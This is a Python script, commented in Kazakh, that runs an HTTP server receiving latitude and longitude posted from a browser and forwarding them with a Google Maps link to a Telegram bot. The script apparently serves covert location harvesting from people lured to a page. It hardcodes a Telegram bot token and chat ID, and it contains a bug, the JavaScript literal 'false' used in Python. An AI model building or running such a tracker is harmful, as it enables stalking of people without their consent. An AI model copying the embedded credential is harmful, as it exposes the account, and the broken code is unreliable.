import json
import requests
from http.server import HTTPServer, SimpleHTTPRequestHandler

# ТЕЛЕГРАМ БОТ БАПТАУЛАРЫ (Сенің мәліметтерің енгізілді)
TELEGRAM_TOKEN = "8942067798:AAFU01Yqjo4KJi3GYX07JUYbyK1d8SGjU-Q"
CHAT_ID = "7594678193"

class GeoHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        # Браузермен байланыс орнату (CORS)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        
        # Браузерден келген деректі оқу
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            lat = data.get('lat')
            lon = data.get('lon')
            
            print(f"\n[+] Координаттар сәтті алынды: {lat}, {lon}")
            
            # Google Maps сілтемесін жасау
            maps_url = f"https://www.google.com/maps?q={lat},{lon}"
            
            # Телеграм хабарламасының мәтіні
            message = (
                f"🎯 <b>ЖАҢА ГЕОЛОКАЦИЯ АНЫҚТАЛДЫ!</b>\n\n"
                f"📍 Ендік (Lat): <code>{lat}</code>\n"
                f"📍 Бойлық (Lon): <code>{lon}</code>\n\n"
                f"🌐 <a href='{maps_url}'>Google Картадан көру</a>"
            )
            
            # Telegram API арқылы жіберу
            tg_msg_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            payload = {
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": false
            }
            
            response = requests.post(tg_msg_url, json=payload)
            if response.status_code == 200:
                print("[+] Мәлімет Telegram ботыңызға сәтті жолданды!")
            else:
                print(f"[-] Telegram қатесі: {response.text}")
                
        except Exception as e:
            print(f"[-] Деректі өңдеуде қате шықты: {e}")
            
        self.wfile.write(b'{"status": "success"}')

print("Сервер http://localhost:8080 мекенжайында іске қосылды...")
print("Дайын мәліметтер тікелей Telegram-ға жолданады.")
server = HTTPServer(('0.0.0.0', 8080), GeoHandler)
server.serve_forever()
